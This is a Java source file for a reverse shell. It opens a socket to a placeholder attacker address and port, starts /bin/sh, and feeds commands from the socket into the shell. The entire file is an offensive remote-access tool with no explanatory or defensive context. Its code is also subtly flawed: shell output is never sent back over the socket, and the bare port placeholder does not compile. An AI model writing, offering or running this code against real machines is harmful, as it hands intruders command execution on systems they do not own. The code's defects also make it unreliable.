import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "YOUR_IP_ADDRESS";
        int port = YOUR_PORT_NUMBER;
        
        try {
            Socket socket = new Socket(host, port);
            Process process = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
            
            InputStream processInput = process.getInputStream();
            InputStream socketInput = socket.getInputStream();
            OutputStream processOutput = process.getOutputStream();
            OutputStream socketOutput = socket.getOutputStream();
            
            byte[] buffer = new byte[1024];
            int bytesRead;
            
            while ((bytesRead = socketInput.read(buffer)) != -1) {
                processOutput.write(buffer, 0, bytesRead);
                processOutput.flush();
            }
            
            process.waitFor();
            
            processInput.close();
            socketInput.close();
            processOutput.close();
            socketOutput.close();
            
            socket.close();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
